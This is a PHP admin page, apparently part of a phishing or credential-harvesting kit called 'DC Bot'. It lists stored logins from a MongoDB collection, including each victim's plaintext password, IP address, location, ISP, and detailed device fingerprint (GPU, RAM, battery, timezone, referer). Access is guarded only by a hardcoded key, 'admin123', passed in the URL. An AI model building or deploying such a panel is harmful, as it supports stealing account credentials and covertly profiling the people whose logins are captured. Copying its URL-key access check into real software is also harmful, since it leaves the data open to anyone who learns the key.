<?php
define("ADMIN_KEY", "admin123");

if (($_GET["key"] ?? "") !== ADMIN_KEY) {
    http_response_code(403);
    die("<h2 style='font-family:sans-serif'>Access denied. Admins only.</h2>");
}

require __DIR__ . "/db.php";

try {
    $query = new MongoDB\Driver\Query([], ["sort" => ['_id' => -1], "limit" => 100]);
    $rows = $manager->executeQuery("$MONGO_DB.$MONGO_COL", $query);
} catch (Exception $e) {
    die("DB error: " . htmlspecialchars($e->getMessage()));
}
?>
<!doctype html>
<html><head><meta charset="utf-8"><title>DC Bot - All Logins</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#fafafa;padding:20px}
h2{margin-bottom:10px}
.info{margin-bottom:20px;color:#666}
table{border-collapse:collapse;width:100%;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.1)}
th,td{padding:10px 14px;text-align:left;border-bottom:1px solid #eee;font-size:13px}
th{background:#000;color:#fff;font-weight:600;white-space:nowrap}
tr:hover{background:#f9f9f9}
a{color:#0064e0}
.card{background:#fff;border:1px solid #e5e5e5;border-radius:12px;padding:20px;margin:15px 0}
</style>
</head>
<body>
<h2>DC Bot - All Stored Logins</h2>
<p class="info">Open with <code>?key=admin123</code>. <a href="index.html">Back to login</a></p>

<?php foreach ($rows as $i => $row): ?>
<div class="card">
<h3>Login #<?= count($rows) - $i ?></h3>
<table>
<tr><th colspan="6" style="background:#2ecc71">🟢 User Login</th></tr>
<tr><td><b>User</b></td><td><?= htmlspecialchars($row->username ?? "") ?></td>
    <td><b>IP</b></td><td><?= htmlspecialchars($row->ip ?? "") ?></td>
    <td><b>Location</b></td><td><?= htmlspecialchars($row->location ?? "") ?></td></tr>
<tr><td><b>ISP</b></td><td colspan="2"><?= htmlspecialchars($row->isp ?? "") ?></td>
    <td><b>ASN</b></td><td colspan="2"><?= htmlspecialchars($row->asn ?? "") ?></td></tr>
<tr><td><b>Hostname</b></td><td colspan="5"><?= htmlspecialchars($row->hostname ?? "none") ?></td></tr>

<tr><th colspan="6" style="background:#3498db">💻 Device Info</th></tr>
<tr><td><b>OS</b></td><td><?= htmlspecialchars($row->os ?? "") ?></td>
    <td><b>Browser</b></td><td><?= htmlspecialchars($row->browser ?? "") ?></td>
    <td><b>Screen</b></td><td><?= htmlspecialchars($row->screen ?? "") ?></td></tr>
<tr><td><b>CPU</b></td><td><?= htmlspecialchars($row->cpu_cores ?? "") ?></td>
    <td><b>RAM</b></td><td><?= htmlspecialchars($row->ram ?? "") ?></td>
    <td><b>GPU</b></td><td><?= htmlspecialchars($row->gpu ?? "") ?></td></tr>
<tr><td><b>Network</b></td><td><?= htmlspecialchars($row->nettype ?? "") ?></td>
    <td><b>Battery</b></td><td><?= htmlspecialchars($row->battery ?? "") ?></td>
    <td><b>Timezone</b></td><td><?= htmlspecialchars($row->timezone ?? "") ?></td></tr>

<tr><th colspan="6" style="background:#555">📋 Other</th></tr>
<tr><td><b>Pass</b></td><td colspan="2"><?= htmlspecialchars($row->password_plain ?? "") ?></td>
    <td><b>Language</b></td><td colspan="2"><?= htmlspecialchars($row->language ?? "") ?></td></tr>
<tr><td><b>Referer</b></td><td colspan="2" style="max-width:250px;overflow-wrap:anywhere;font-size:12px"><?= htmlspecialchars($row->referer ?? "") ?></td>
    <td><b>Time</b></td><td colspan="2"><?= htmlspecialchars($row->created_at ?? "") ?></td></tr>
</table>
</div>
<?php endforeach; ?>

</body></html>
